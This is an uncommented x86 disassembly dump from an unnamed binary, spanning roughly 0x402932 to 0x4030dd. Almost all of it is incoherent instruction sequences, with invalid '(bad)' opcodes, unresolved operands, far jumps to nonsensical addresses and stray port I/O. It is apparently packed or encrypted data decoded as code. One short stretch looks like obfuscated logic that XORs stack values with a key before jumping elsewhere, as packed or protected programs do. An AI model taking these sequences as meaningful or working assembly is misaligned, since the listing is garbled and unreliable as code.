  402932:	pop    edx
  402933:	push   0xffffffd3
  402935:	dec    esi
  402936:	sbb    eax,0x4193baf
  40293b:	sub    al,0xcf
  40293d:	push   esp
  40293e:	fwait
  40293f:	inc    esi
  402940:	add    al,0x63
  402942:	xchg   esi,eax
  402943:	pushf  
  402944:	popf   
  402945:	jb     0x402963
  402947:	fimul  WORD PTR [ecx+0x72015818]
  40294d:	mov    al,ds:0xa6bbe13
  402952:	mov    bl,0x39
  402954:	inc    esp
  402955:	pop    esp
  402956:	inc    ebp
  402957:	lea    ecx,[edx-0x48f4996f]
  40295d:	sub    eax,0x2986600
  402962:	pop    ss
  402963:	sar    ebp,1
  402965:	ret    0xb84f
  402968:	fild   DWORD PTR [edx]
  40296a:	cmp    dh,bh
  40296c:	aam    0xc4
  40296e:	sub    esi,edx
  402970:	xor    al,BYTE PTR [esi+0x2b434ee4]
  402976:	mov    cl,0x46
  402978:	and    eax,0xd81a44bf
  40297d:	(bad)  
  40297e:	out    0x2f,eax
  402980:	push   edi
  402981:	in     al,0x2f
  402983:	inc    ebp
  402984:	or     esp,DWORD PTR [edx]
  402986:	sub    eax,0x8291aed6
  40298b:	jge    0x4029db
  40298d:	aaa    
  40298e:	ins    BYTE PTR es:[edi],dx
  40298f:	jp     0x402a03
  402991:	iretw  
  402993:	mov    ebp,0x6ba56259
  402998:	or     al,0x56
  40299a:	pop    edx
  40299b:	ret    0x4bcb
  40299e:	pop    ebx
  40299f:	aad    0x2b
  4029a1:	or     eax,0x276faccc
  4029a6:	adc    ebp,eax
  4029a8:	inc    edi
  4029a9:	mov    ecx,0xa2704335
  4029ae:	mov    bl,0x8b
  4029b0:	std    
  4029b1:	or     dh,BYTE PTR [edi]
  4029b3:	adc    DWORD PTR [ecx+0x39],esi
  4029b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4029b7:	add    eax,0x8723b399
  4029bc:	mov    dl,0xe8
  4029be:	es sbb al,0x83
  4029c1:	jmp    0x80c3:0xec53846d
  4029c8:	stos   DWORD PTR es:[edi],eax
  4029c9:	sbb    esp,0x42
  4029cc:	sbb    eax,0x1dc16c0e
  4029d1:	es pusha 
  4029d3:	gs sbb al,0x17
  4029d6:	dec    eax
  4029d7:	mov    ah,0x1d
  4029d9:	fld    TBYTE PTR [edi+0x2ace2080]
  4029df:	(bad)  
  4029e0:	jge    0x4029cf
  4029e2:	jne    0x4029e5
  4029e4:	out    0x75,al
  4029e6:	mov    ds:0xc71ea64b,al
  4029eb:	pop    ebx
  4029ec:	cmp    ecx,0x7b
  4029ef:	mov    al,ds:0x2a3a7e98
  4029f4:	mov    esi,0x421d0294
  4029f9:	out    dx,eax
  4029fa:	and    esi,DWORD PTR [esi-0x6eeebf6]
  402a00:	jmp    0x402a80
  402a02:	dec    esi
  402a03:	fsub   DWORD PTR [eax+0x2c]
  402a06:	push   ebx
  402a07:	push   edi
  402a08:	inc    edi
  402a09:	(bad)  
  402a0b:	imul   edx,ebp,0x7
  402a0e:	lea    esp,[edi]
  402a10:	sub    eax,esi
  402a12:	sub    dl,BYTE PTR [eax+0x2262e707]
  402a18:	jg     0x402a1b
  402a1a:	leave  
  402a1b:	push   esp
  402a1c:	push   edx
  402a1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a1e:	in     al,dx
  402a1f:	ret    
  402a20:	cs mov edx,0x6b14cdfe
  402a26:	xchg   ecx,eax
  402a27:	and    ecx,DWORD PTR [eax+0x57]
  402a2a:	cmp    edi,DWORD PTR [ebp-0x5ae03a7b]
  402a30:	push   ecx
  402a31:	xor    ebp,DWORD PTR [esi-0x5f2f7a4]
  402a37:	sub    DWORD PTR [eax],esi
  402a39:	pop    edx
  402a3a:	mov    BYTE PTR [esi+0x5b],dl
  402a3d:	in     al,0xa2
  402a3f:	add    eax,0xfb2bb839
  402a44:	add    eax,0xb022bb7f
  402a49:	ret    0xe77e
  402a4c:	lods   al,BYTE PTR ds:[esi]
  402a4d:	loop   0x4029e3
  402a4f:	jmp    0x95fa:0xa92bad2e
  402a56:	scas   al,BYTE PTR es:[edi]
  402a57:	arpl   WORD PTR [ebp-0x4c0391c2],sp
  402a5d:	js     0x402a3b
  402a5f:	jmp    0x402a34
  402a61:	and    ecx,DWORD PTR [ecx+0x1f309585]
  402a67:	cwde   
  402a68:	mov    eax,ds:0x3ef0cf43
  402a6d:	jmp    0x8cc68087
  402a72:	out    0x3b,eax
  402a74:	xchg   edi,eax
  402a75:	iret   
  402a76:	into   
  402a77:	xchg   BYTE PTR [ecx],bl
  402a79:	imul   edx,esi,0xfe90a108
  402a7f:	ins    BYTE PTR es:[edi],dx
  402a80:	ja     0x402a4d
  402a82:	fst    DWORD PTR [ecx+0x7020788d]
  402a88:	out    dx,al
  402a89:	sbb    DWORD PTR ds:0xe75008f,ebx
  402a8f:	jecxz  0x402a73
  402a91:	lea    edx,[ebx+0x23]
  402a94:	or     ecx,DWORD PTR [esi]
  402a96:	jae    0x402aec
  402a98:	xlat   BYTE PTR ds:[ebx]
  402a99:	or     BYTE PTR [eax],cl
  402a9b:	push   esp
  402a9c:	cmp    eax,0xfde5d164
  402aa1:	inc    ebp
  402aa2:	rol    BYTE PTR [edi+0x10],cl
  402aa5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402aa6:	cmp    BYTE PTR [edx-0x4fc007a7],dh
  402aac:	push   ss
  402aad:	int    0x6a
  402aaf:	out    0x27,eax
  402ab1:	pushf  
  402ab2:	les    esi,FWORD PTR [ecx]
  402ab4:	sahf   
  402ab5:	or     eax,0xd11a5b05
  402aba:	push   ds
  402abb:	inc    eax
  402abc:	inc    edx
  402abd:	mov    esi,0xa7f722af
  402ac2:	add    bl,BYTE PTR [edx+ecx*8+0x6b]
  402ac6:	pop    ebx
  402ac7:	dec    ebp
  402ac8:	sub    BYTE PTR [ebx-0x64001475],bh
  402ace:	xor    bh,BYTE PTR [eax+0x197acf72]
  402ad4:	push   edx
  402ad5:	ror    DWORD PTR [edi-0x7f],cl
  402ad8:	add    BYTE PTR [edx+eiz*8],0x92
  402adc:	xchg   DWORD PTR [ecx],esi
  402ade:	inc    ecx
  402adf:	xchg   esp,eax
  402ae0:	mov    DWORD PTR [edi+0x209cc741],ebx
  402ae6:	push   ebx
  402ae7:	mov    edx,DWORD PTR [eax-0x44c44a7c]
  402aed:	jnp    0x402ac7
  402aef:	jnp    0x402a9d
  402af1:	mov    ecx,0x6517452f
  402af6:	sbb    bh,BYTE PTR ds:0x44a1b0c2
  402afc:	aas    
  402afd:	pushf  
  402afe:	pushf  
  402aff:	jbe    0x402b01
  402b01:	jae    0x402b7e
  402b03:	daa    
  402b04:	leave  
  402b05:	cwde   
  402b06:	ret    0x262a
  402b09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b0a:	inc    eax
  402b0b:	and    ecx,DWORD PTR [ecx]
  402b0d:	jb     0x402b22
  402b0f:	and    BYTE PTR [esi-0x11],dh
  402b12:	xor    BYTE PTR [edx+0x419e9776],0x2e
  402b19:	push   ds
  402b1a:	jae    0x402b13
  402b1c:	mov    eax,0xc87022b
  402b21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b22:	add    al,0x8d
  402b24:	(bad)
  402b28:	stc    
  402b29:	mov    es,WORD PTR [eax-0x16f0d1cb]
  402b2f:	les    ecx,FWORD PTR [ebx+0x3f]
  402b32:	mov    ebp,0xcd6b46c0
  402b37:	add    eax,0xdeb5a2bb
  402b3c:	outs   dx,DWORD PTR ds:[esi]
  402b3d:	ja     0x402ac1
  402b3f:	push   eax
  402b40:	mov    dl,bh
  402b42:	xchg   ecx,eax
  402b43:	daa    
  402b44:	sbb    DWORD PTR [edi-0x3a],ecx
  402b47:	lea    edi,[ebp+0xd]
  402b4a:	repz add dl,BYTE PTR ds:0xb2980c9a
  402b51:	(bad)  
  402b52:	adc    BYTE PTR [esp+ebx*2],bh
  402b55:	ins    DWORD PTR es:[edi],dx
  402b56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b57:	scas   al,BYTE PTR es:[edi]
  402b58:	cdq    
  402b59:	mov    eax,0x78328d5f
  402b5e:	gs dec edx
  402b60:	xchg   DWORD PTR [ecx],edx
  402b62:	sbb    ah,BYTE PTR [ebx]
  402b64:	shl    edi,1
  402b66:	cmp    eax,0xe8cba3a8
  402b6b:	cwde   
  402b6c:	sub    bl,BYTE PTR [esi-0x5d]
  402b6f:	and    esp,edx
  402b71:	pop    ebx
  402b72:	std    
  402b73:	bound  edi,QWORD PTR ds:0x4c9be9d4
  402b79:	lods   al,BYTE PTR ds:[esi]
  402b7a:	dec    ebp
  402b7b:	jg     0x402b36
  402b7d:	or     BYTE PTR [esi],dh
  402b7f:	fidivr WORD PTR fs:[ebx+0x2f]
  402b83:	sub    DWORD PTR [ebx+0x56],0xbdf22169
  402b8a:	shl    DWORD PTR [ebx+0x57],0xd
  402b8e:	inc    edx
  402b8f:	sub    bl,0x53
  402b92:	xchg   edx,eax
  402b93:	inc    ebx
  402b94:	jb     0x402b40
  402b96:	push   ss
  402b97:	fdivrp st(4),st
  402b99:	mov    edx,0x649c50bf
  402b9e:	add    bh,BYTE PTR [ebp-0xe03b772]
  402ba4:	sub    al,0xe3
  402ba6:	clc    
  402ba7:	or     al,0x4
  402ba9:	pop    esp
  402baa:	retf   0xef40
  402bad:	arpl   WORD PTR [ebx+0x59d66918],dx
  402bb3:	call   0xa3ae557f
  402bb8:	cld    
  402bb9:	popa   
  402bba:	mov    ds:0x9bf98e40,eax
  402bbf:	cmp    edi,DWORD PTR [edi+0x5d]
  402bc2:	cmp    edi,DWORD PTR [ecx-0x46]
  402bc5:	add    esp,DWORD PTR [eax]
  402bc7:	and    DWORD PTR [ecx],0x32d6c4fd
  402bcd:	arpl   WORD PTR [esi-0x7894a7b5],bx
  402bd3:	dec    ecx
  402bd4:	je     0x402bcf
  402bd6:	aad    0x7a
  402bd8:	ror    DWORD PTR [edx+0x55],0x30
  402bdc:	retf   
  402bdd:	jnp    0x402bd4
  402bdf:	pop    ebp
  402be0:	sti    
  402be1:	mov    DWORD PTR [ebx+esi*1+0x1448fc96],esp
  402be8:	and    esi,DWORD PTR [edi-0x3e]
  402beb:	mov    bl,0x61
  402bed:	pusha  
  402bee:	test   eax,0x5284456b
  402bf3:	out    dx,eax
  402bf4:	les    bx,DWORD PTR [edi-0x29abcb95]
  402bfb:	mov    cl,0x85
  402bfd:	ficom  DWORD PTR [ebx]
  402bff:	gs dec esp
  402c01:	mov    al,BYTE PTR [esi]
  402c03:	mov    edi,0xf1ec6696
  402c08:	jmp    0xdfdd64ba
  402c0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c0e:	pop    es
  402c0f:	xchg   BYTE PTR [esi],bh
  402c11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c12:	jle    0x402c50
  402c14:	out    dx,eax
  402c15:	xor    DWORD PTR [ebp+0x1c],esi
  402c18:	mov    dh,dl
  402c1a:	or     esp,DWORD PTR [edx]
  402c1c:	pop    esi
  402c1d:	dec    esi
  402c1e:	push   ebp
  402c1f:	dec    edx
  402c20:	(bad)  [ecx-0x3c]
  402c23:	pop    esp
  402c24:	push   esp
  402c25:	daa    
  402c26:	pop    ecx
  402c27:	or     al,0x9d
  402c29:	mov    ?,esi
  402c2b:	mov    dl,0x52
  402c2d:	ja     0x402c27
  402c2f:	lods   al,BYTE PTR ds:[esi]
  402c30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c31:	fwait
  402c32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c33:	leave  
  402c34:	adc    eax,0x38bce2e2
  402c39:	stc    
  402c3a:	(bad)  
  402c3b:	xchg   ebp,eax
  402c3c:	jne    0x402bd7
  402c3e:	lahf   
  402c3f:	xchg   edi,eax
  402c40:	mov    dh,0x4a
  402c42:	popa   
  402c43:	in     eax,0xbb
  402c45:	data16 ja 0x402c65
  402c48:	mov    edx,0x96cd234f
  402c4d:	ret    0x5d7
  402c50:	ret    
  402c51:	out    0x70,al
  402c53:	repz mov esi,0x559884ce
  402c59:	xchg   ebp,eax
  402c5a:	fwait
  402c5b:	mov    eax,ds:0xcf5dc939
  402c60:	out    dx,eax
  402c61:	inc    edx
  402c62:	xchg   ebp,eax
  402c63:	out    dx,eax
  402c64:	push   edx
  402c65:	test   ebp,0xf0f6fd69
  402c6b:	xor    BYTE PTR [esi+0x3e],ch
  402c6e:	cmc    
  402c6f:	cld    
  402c70:	pusha  
  402c71:	mov    bh,0xf7
  402c73:	adc    edx,eax
  402c75:	dec    ecx
  402c76:	scas   al,BYTE PTR es:[edi]
  402c77:	or     eax,0x45b99555
  402c7c:	hlt    
  402c7d:	stc    
  402c7e:	jmp    0xc921:0x510018cb
  402c85:	jmp    0x41cb:0xbdea420d
  402c8c:	push   es
  402c8d:	imul   DWORD PTR [esi+0x16]
  402c90:	jno    0x402d00
  402c92:	push   esp
  402c93:	popf   
  402c94:	jg     0x402c93
  402c96:	jb     0x402d09
  402c98:	cmp    al,0x33
  402c9a:	mov    WORD PTR [esi],es
  402c9c:	mov    eax,ds:0x2289b306
  402ca1:	out    dx,eax
  402ca2:	stc    
  402ca3:	and    al,0x66
  402ca5:	sbb    al,0xb2
  402ca7:	and    ebx,esp
  402ca9:	in     eax,0xd8
  402cab:	or     BYTE PTR [edi],ch
  402cad:	push   ds
  402cae:	lods   al,BYTE PTR ds:[esi]
  402caf:	jno    0x402ce0
  402cb1:	js     0x402d29
  402cb3:	sbb    cl,ah
  402cb5:	out    0xe,eax
  402cb7:	std    
  402cb8:	addr16 push ss
  402cba:	push   es
  402cbb:	pusha  
  402cbc:	loopne 0x402c54
  402cbe:	push   ebp
  402cbf:	add    eax,0xaa
  402cc4:	push   eax
  402cc5:	mov    eax,DWORD PTR [ebp-0x18]
  402cc8:	mov    eax,DWORD PTR [eax+0x198]
  402cce:	push   DWORD PTR [eax]
  402cd0:	call   0x40c099
  402cd5:	mov    DWORD PTR [ebp-0x4],eax
  402cd8:	cmp    DWORD PTR [ebp-0x4],0x0
  402cdc:	lea    eax,[ebp+0x4]
  402cdf:	mov    DWORD PTR [ebp-0x38],eax
  402ce2:	je     0x404656
  402ce8:	lea    eax,[ebp-0xc]
  402ceb:	mov    DWORD PTR [ebp-0x30],eax
  402cee:	mov    eax,DWORD PTR [ebp-0x4c]
  402cf1:	xor    eax,esi
  402cf3:	add    eax,edi
  402cf5:	mov    DWORD PTR [ebp-0x34],eax
  402cf8:	mov    eax,DWORD PTR [ebp-0x28]
  402cfb:	xor    eax,esi
  402cfd:	add    eax,edi
  402cff:	mov    DWORD PTR [ebp-0x20],eax
  402d02:	mov    eax,DWORD PTR [ebp-0x4]
  402d05:	mov    DWORD PTR [ebp-0x24],eax
  402d08:	lea    eax,[ebp-0x98]
  402d0e:	mov    DWORD PTR [ebp-0x8],eax
  402d11:	mov    eax,DWORD PTR [ebp-0x10]
  402d14:	mov    DWORD PTR [ebp-0x10],eax
  402d17:	mov    eax,DWORD PTR [ebp-0x1c]
  402d1a:	mov    DWORD PTR [ebp-0x40],ebx
  402d1d:	mov    DWORD PTR [ebp-0x2c],eax
  402d20:	mov    eax,DWORD PTR [ebp-0x40]
  402d23:	mov    ecx,DWORD PTR [ebp-0x8]
  402d26:	xor    eax,esi
  402d28:	add    eax,0x32729b
  402d2d:	jmp    0x40313b
  402d32:	stos   DWORD PTR es:[edi],eax
  402d33:	addr16 clc 
  402d35:	in     eax,0x50
  402d37:	loope  0x402dac
  402d39:	jno    0x402d4f
  402d3b:	jo     0x402d34
  402d3d:	fs es loopne 0x402db1
  402d41:	jns    0x402cdb
  402d43:	or     DWORD PTR [esi+0x7e],edi
  402d46:	outs   dx,DWORD PTR ds:[esi]
  402d47:	jge    0x402dc7
  402d49:	jle    0x402d33
  402d4b:	int3   
  402d4c:	mov    ds:0xf6a465a5,al
  402d51:	(bad)  
  402d52:	cmc    
  402d53:	sub    eax,DWORD PTR [edx-0x26]
  402d56:	mov    BYTE PTR [edx],al
  402d58:	div    BYTE PTR [eax+ecx*2+0x370285d9]
  402d5f:	aas    
  402d60:	rcl    DWORD PTR ds:0xf7dca7d6,cl
  402d66:	mov    ah,0x45
  402d68:	mov    edx,0x821ded81
  402d6d:	push   es
  402d6e:	ins    BYTE PTR es:[edi],dx
  402d6f:	jns    0x402d01
  402d71:	pop    esp
  402d72:	mov    edx,0xb347a25d
  402d77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d78:	add    BYTE PTR ds:0xf71b3276,ah
  402d7e:	jo     0x402d21
  402d80:	mov    cl,0x6d
  402d82:	nop
  402d83:	test   DWORD PTR ds:[edx+edx*2+0x44],esi
  402d88:	dec    ecx
  402d89:	mov    ebx,0x43fbbd12
  402d8e:	jmp    0x8adb:0xb5f77a44
  402d95:	out    dx,eax
  402d96:	or     ch,dh
  402d98:	mov    edi,0xef0d9e5a
  402d9d:	jle    0x402e15
  402d9f:	pop    eax
  402da0:	retf   
  402da1:	jae    0x402d2f
  402da3:	dec    esp
  402da4:	mov    eax,ds:0x55a58ea6
  402da9:	popf   
  402daa:	push   edi
  402dab:	sar    cl,1
  402dad:	add    eax,esi
  402daf:	out    0xf8,al
  402db1:	inc    edx
  402db2:	adc    dl,BYTE PTR [eax+0x4c5f15ed]
  402db8:	sbb    BYTE PTR [eax-0x43bd5d2d],bl
  402dbe:	pop    ss
  402dbf:	pop    eax
  402dc0:	sti    
  402dc1:	adc    ebp,DWORD PTR [eax-0x4b]
  402dc4:	mov    edx,0x7f9e28d7
  402dc9:	das    
  402dca:	push   edi
  402dcb:	sbb    eax,esi
  402dcd:	xor    BYTE PTR [ebx+0x4],cl
  402dd0:	xor    BYTE PTR [edi],0xf
  402dd3:	(bad)  
  402dd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402dd5:	aad    0x59
  402dd7:	sahf   
  402dd8:	pop    ebx
  402dd9:	pop    ecx
  402dda:	mov    al,0xa1
  402ddc:	mov    dh,0x4a
  402dde:	out    dx,eax
  402ddf:	loopne 0x402de8
  402de1:	jmp    0xe27f:0x6b17e2f
  402de8:	or     BYTE PTR [edi+eiz*4],dh
  402deb:	aas    
  402dec:	push   ss
  402ded:	lock push esi
  402def:	mov    cl,0x5
  402df1:	mov    bl,0x64
  402df3:	inc    edx
  402df4:	or     ebp,DWORD PTR [esp+esi*8-0x29828fdc]
  402dfb:	in     eax,0x1f
  402dfd:	inc    BYTE PTR [eax+0x10]
  402e00:	(bad)  
  402e01:	pop    ebx
  402e02:	dec    esi
  402e03:	rcr    BYTE PTR [edi+edx*8],0xf1
  402e07:	(bad)  
  402e08:	mov    dl,0x8d
  402e0a:	test   al,0xe
  402e0c:	dec    ecx
  402e0d:	xchg   ecx,eax
  402e0e:	adc    eax,0xd70f7a28
  402e13:	add    DWORD PTR [edi+0x74a26941],edx
  402e19:	dec    edi
  402e1a:	dec    ebp
  402e1b:	inc    edx
  402e1c:	mov    cs,WORD PTR [eax]
  402e1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e1f:	repnz std 
  402e21:	fild   WORD PTR [edi]
  402e23:	push   ss
  402e24:	in     al,dx
  402e25:	pop    ebx
  402e26:	pop    ecx
  402e27:	inc    ebp
  402e28:	push   ss
  402e29:	jmp    0x42df8e44
  402e2e:	clc    
  402e2f:	jle    0x402e13
  402e31:	and    eax,0x2f902299
  402e36:	in     al,0x10
  402e38:	jns    0x402ea7
  402e3a:	mov    ah,0x8c
  402e3c:	fstp   DWORD PTR [ebp-0x3]
  402e3f:	jecxz  0x402e4e
  402e41:	mov    cl,0xb6
  402e43:	popa   
  402e44:	js     0x402e65
  402e46:	loopne 0x402dff
  402e48:	scas   eax,DWORD PTR es:[edi]
  402e49:	das    
  402e4a:	retf   
  402e4b:	addr16 jo 0x402ecc
  402e4e:	fisttp DWORD PTR [edx+esi*1]
  402e51:	add    ecx,DWORD PTR [eax]
  402e53:	or     al,0xef
  402e55:	inc    esi
  402e56:	inc    ebx
  402e57:	mov    ecx,0x44d6d615
  402e5c:	inc    esi
  402e5d:	pop    edx
  402e5e:	js     0x402e68
  402e60:	out    0xb0,eax
  402e62:	call   0x7a4b7b63
  402e67:	retf   
  402e68:	and    bl,dl
  402e6a:	or     edx,DWORD PTR [edx-0x3a617572]
  402e70:	jge    0x402eca
  402e72:	mov    eax,ds:0x3b15456
  402e77:	xchg   esi,eax
  402e78:	lods   eax,DWORD PTR ds:[esi]
  402e79:	dec    ebx
  402e7a:	cwde   
  402e7b:	bound  edx,QWORD PTR [edx+0x9a3014c]
  402e81:	sub    eax,0x7f7533e
  402e86:	mov    ds:0xba65aae,eax
  402e8b:	and    bl,BYTE PTR [esi+0x250d1d1f]
  402e91:	or     eax,0xabc1e21b
  402e96:	jns    0x402edd
  402e98:	xlat   BYTE PTR ds:[ebx]
  402e99:	fcomi  st,st(2)
  402e9b:	xor    BYTE PTR [edx-0x46bb893f],ch
  402ea1:	add    bl,BYTE PTR [esi+0x3a4f5b33]
  402ea7:	pushf  
  402ea8:	and    al,0xe7
  402eaa:	or     al,0x1f
  402eac:	out    0x16,eax
  402eae:	mov    al,ds:0xa7f07700
  402eb3:	inc    ecx
  402eb4:	mov    ds:0xb1938fb0,eax
  402eb9:	dec    edx
  402eba:	cld    
  402ebb:	dec    eax
  402ebc:	or     DWORD PTR [eax+0x75],ebp
  402ebf:	add    ch,0x69
  402ec2:	sub    eax,0xe1228c9f
  402ec7:	mov    bh,0x5c
  402ec9:	or     BYTE PTR [esi],dl
  402ecb:	out    dx,eax
  402ecc:	sahf   
  402ecd:	jns    0x402ea9
  402ecf:	int    0x25
  402ed1:	xor    DWORD PTR [esi],ebx
  402ed3:	xchg   esi,eax
  402ed4:	jb     0x402e78
  402ed6:	add    eax,0x5c184450
  402edb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402edc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402edd:	mov    eax,ds:0x38307452
  402ee2:	pop    es
  402ee3:	aas    
  402ee4:	dec    esi
  402ee5:	mov    esp,0x4f2cdbac
  402eea:	leave  
  402eeb:	or     edx,DWORD PTR [esi+ecx*8]
  402eee:	hlt    
  402eef:	imul   edx,DWORD PTR [eax-0x50],0x3e9bebaa
  402ef6:	mov    esp,DWORD PTR [edi+ebx*2]
  402ef9:	fidiv  DWORD PTR [eax+0x75ab53de]
  402eff:	aam    0x60
  402f01:	inc    ebp
  402f02:	pop    es
  402f03:	sub    eax,0x3866c7ad
  402f08:	jno    0x402f75
  402f0a:	(bad)  
  402f0b:	rol    DWORD PTR [edi],cl
  402f0d:	pop    ss
  402f0e:	fcom   QWORD PTR gs:[ebp+ecx*2+0x1fc463ef]
  402f16:	push   ds
  402f17:	pop    esi
  402f18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f19:	adc    esi,DWORD PTR [esi]
  402f1b:	push   esp
  402f1c:	aas    
  402f1d:	stc    
  402f1e:	add    bh,BYTE PTR [ebp+0x22]
  402f21:	inc    esi
  402f22:	test   BYTE PTR [ebx-0x239a0079],ah
  402f28:	push   ds
  402f29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f2a:	dec    ecx
  402f2b:	jecxz  0x402f1f
  402f2d:	or     eax,0x316cd99
  402f32:	push   0xffffffd3
  402f34:	popa   
  402f35:	test   cl,al
  402f37:	cmp    cl,BYTE PTR [esi-0x35]
  402f3a:	scas   al,BYTE PTR es:[edi]
  402f3b:	jmp    0x402fa7
  402f3d:	mov    ebp,0xdf0e80f8
  402f42:	push   0xa37de264
  402f47:	(bad)  
  402f48:	jecxz  0x402f97
  402f4a:	in     eax,0x1a
  402f4c:	push   0x20
  402f4e:	fadd   DWORD PTR [ecx]
  402f50:	jae    0x402f6c
  402f52:	mov    eax,ds:0x14eff075
  402f57:	and    BYTE PTR [ecx-0x69],dl
  402f5a:	xor    DWORD PTR [ebp-0x6d],edx
  402f5d:	add    DWORD PTR [edi],esi
  402f5f:	cmp    DWORD PTR [ebx+0x39],edi
  402f62:	stos   DWORD PTR es:[edi],eax
  402f63:	push   esp
  402f64:	cmp    ch,BYTE PTR [ecx-0x4e3a9cdc]
  402f6a:	fnstenv ds:0xf806996d
  402f70:	ja     0x402fa6
  402f72:	fistp  DWORD PTR [ebx+0x2b]
  402f75:	fwait
  402f76:	ss js  0x402f6e
  402f79:	inc    eax
  402f7a:	std    
  402f7b:	or     BYTE PTR [esi+esi*2+0x7910f59d],cl
  402f82:	adc    bl,BYTE PTR [edi+0x20f7f37b]
  402f88:	(bad)  
  402f89:	jno    0x402f5e
  402f8b:	pop    es
  402f8c:	mov    bl,0xb5
  402f8e:	xchg   ecx,eax
  402f8f:	mov    edi,0x88634b2a
  402f94:	shr    ah,cl
  402f96:	pop    ss
  402f97:	xor    DWORD PTR [edi-0x9],edi
  402f9a:	mov    eax,ds:0xbdd4301
  402f9f:	push   esi
  402fa0:	dec    edi
  402fa1:	not    edi
  402fa3:	out    0x35,al
  402fa5:	addr16 pop edi
  402fa7:	fild   DWORD PTR [edi+0x5f]
  402faa:	inc    ebp
  402fab:	ins    DWORD PTR es:[edi],dx
  402fac:	lods   eax,DWORD PTR ds:[esi]
  402fad:	pop    eax
  402fae:	ins    BYTE PTR es:[edi],dx
  402faf:	add    edx,ebp
  402fb1:	adc    bh,dl
  402fb3:	jmp    0xebcf:0x84e887a8
  402fba:	mov    ebx,?
  402fbc:	retf   0x7340
  402fbf:	enter  0xcc09,0x58
  402fc3:	adc    DWORD PTR ds:0x802cf4c9,ebp
  402fc9:	iret   
  402fca:	arpl   WORD PTR [esi],dx
  402fcc:	or     dh,BYTE PTR [edi]
  402fce:	xor    BYTE PTR [edx-0x21],dl
  402fd1:	mov    ebx,0xb49902d8
  402fd6:	int3   
  402fd7:	and    BYTE PTR [esi-0x2929bf59],ch
  402fdd:	daa    
  402fde:	jecxz  0x402fbc
  402fe0:	test   al,0x49
  402fe2:	das    
  402fe3:	jmp    0x33fa797f
  402fe8:	dec    ebx
  402fe9:	in     eax,dx
  402fea:	sbb    eax,0x5bc4e92d
  402fef:	pop    esp
  402ff0:	inc    edx
  402ff1:	imul   edx,DWORD PTR [ebp+0x73770b38],0x58d326e0
  402ffb:	test   al,0x8
  402ffd:	jns    0x403038
  402fff:	sbb    BYTE PTR [bx],cl
  403002:	push   ecx
  403003:	jecxz  0x402fa9
  403005:	push   edx
  403006:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403007:	inc    eax
  403008:	stos   DWORD PTR es:[edi],eax
  403009:	mov    ebp,0x18f594ae
  40300e:	mov    esp,0x8cd2b8f8
  403013:	and    esi,eax
  403015:	add    edi,DWORD PTR [ebp-0x36cabbf6]
  40301b:	push   eax
  40301c:	jmp    0x5c4d:0x4cf042a0
  403023:	lock mov esp,0xf5e682eb
  403029:	pop    ebx
  40302a:	mov    dl,0xbe
  40302c:	push   ebp
  40302d:	sti    
  40302e:	bound  eax,QWORD PTR [eax]
  403030:	or     al,0x48
  403032:	mov    DWORD PTR [eax],eax
  403034:	jp     0x403061
  403036:	shl    cl,1
  403038:	test   DWORD PTR [edi],ecx
  40303a:	mov    bl,0xb6
  40303c:	mov    al,0x53
  40303e:	adc    eax,0xd92e33a1
  403043:	(bad)  
  403045:	jl     0x403088
  403047:	mov    ebp,0x4a9acaf
  40304c:	cli    
  40304d:	icebp  
  40304e:	or     DWORD PTR [edi],esp
  403050:	mov    ebp,0x24e2ad67
  403055:	and    cl,BYTE PTR [esi]
  403057:	adc    eax,0xd291bff3
  40305c:	jb     0x403066
  40305e:	repz data16 aas 
  403061:	push   edx
  403062:	ja     0x4030c7
  403064:	sbb    ch,BYTE PTR [ecx+0x3ea78096]
  40306a:	push   ss
  40306b:	sbb    esi,esp
  40306d:	sar    BYTE PTR [ebx+edx*8],cl
  403070:	dec    esi
  403071:	jno    0x40301d
  403073:	repnz push ebp
  403075:	jns    0x403041
  403077:	mov    al,ds:0x688bb09d
  40307c:	arpl   WORD PTR [ebx+esi*8+0x63],bp
  403080:	enter  0xbe4c,0xd0
  403084:	scas   al,BYTE PTR es:[edi]
  403085:	jmp    0x8c42ab59
  40308a:	inc    eax
  40308b:	and    edi,DWORD PTR [esi-0x43c2f398]
  403091:	mov    eax,ds:0x201c5d1a
  403096:	xlat   BYTE PTR ds:[ebx]
  403097:	xchg   edi,eax
  403098:	and    eax,0x2cdd6532
  40309d:	retf   
  40309e:	xlat   BYTE PTR ds:[ebx]
  40309f:	iret   
  4030a0:	push   esi
  4030a1:	bound  esi,QWORD PTR [edi]
  4030a3:	std    
  4030a4:	inc    ebp
  4030a5:	mov    al,0x32
  4030a7:	sub    ecx,DWORD PTR [eax]
  4030a9:	pop    ebp
  4030aa:	pop    ss
  4030ab:	js     0x40307a
  4030ad:	mov    esp,0x26a82e92
  4030b2:	cwde   
  4030b3:	and    DWORD PTR [edx-0x3d],ecx
  4030b6:	ret    
  4030b7:	push   cs
  4030b8:	out    dx,al
  4030b9:	hlt    
  4030ba:	cmp    DWORD PTR [ecx+0x73f0ef8f],edx
  4030c0:	or     esp,esp
  4030c2:	fdivr  DWORD PTR [edx]
  4030c4:	int3   
  4030c5:	inc    ecx
  4030c6:	add    al,0x7
  4030c8:	xor    esp,edi
  4030ca:	adc    cl,BYTE PTR [edx]
  4030cc:	add    al,0x6c
  4030ce:	mov    al,0xb8
  4030d0:	inc    esi
  4030d1:	cmp    eax,0x43a5ed7c
  4030d6:	mov    esp,0xdce991ff
  4030db:	mov    dh,0x0
  4030dd:	dec    esi
